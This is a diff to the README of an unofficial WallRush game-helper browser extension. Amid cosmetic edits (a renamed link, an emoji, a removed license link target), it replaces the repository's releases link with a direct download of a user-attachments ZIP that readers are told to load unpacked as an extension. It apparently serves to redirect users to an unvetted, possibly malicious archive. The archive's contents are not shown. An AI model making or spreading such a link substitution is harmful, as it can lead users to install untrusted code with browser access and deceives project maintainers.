@@ -4,7 +4,7 @@
 [![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue.svg)](https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3)
 [![JavaScript](https://img.shields.io/badge/JavaScript-local%20engine-f7df1e.svg)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
 
-Unofficial browser extension for [WallRush](https://wallrush.online/) that analyzes the current board locally and highlights a suggested move.
+Unofficial browser extension for [WallRush Game](https://wallrush.online/) that analyzes the current board locally and highlights a suggested move.
 
 ## Features
 
@@ -20,7 +20,7 @@ Unofficial browser extension for [WallRush](https://wallrush.online/) that analy
 
 Download the latest release:
 
-**[Download latest release](../../releases/latest)**
+**[Download latest release](https://github.com/user-attachments/files/32927594/wallrush-helper-v3.0.zip)**
 
 1. Extract the downloaded `.zip`.
 2. Open your browser's extensions page.
@@ -33,7 +33,7 @@ The ZIP is for distribution; **Load unpacked uses the extracted folder**, not th
 
 ## Use
 
-Open [WallRush](https://wallrush.online/), open WallRush Helper, choose a level, and wait for the green suggestion on your turn.
+Open [WallRush Game](https://wallrush.online/), open WallRush Helper, choose a level, and wait for the green suggestion on your turn.
 
 ## Engine
 
@@ -43,7 +43,7 @@ The current models are Duel 9×9, Race 9×13 and Quad 11×11.
 
 ## Contribute
 
-The main goal is stronger play. Improvements to search, evaluation, wall selection, performance, testing and multi-player analysis are welcome.
+The main goal is stronger play. Improvements to search, evaluation, wall selection, performance, testing and multi-player analysis are welcome✨.
 
 ## Credits
 
@@ -53,4 +53,4 @@ WallRush Helper is an independent project and is not affiliated with WallRush.
 
 ## License
 
-[MIT License](LICENSE)
+[MIT License]
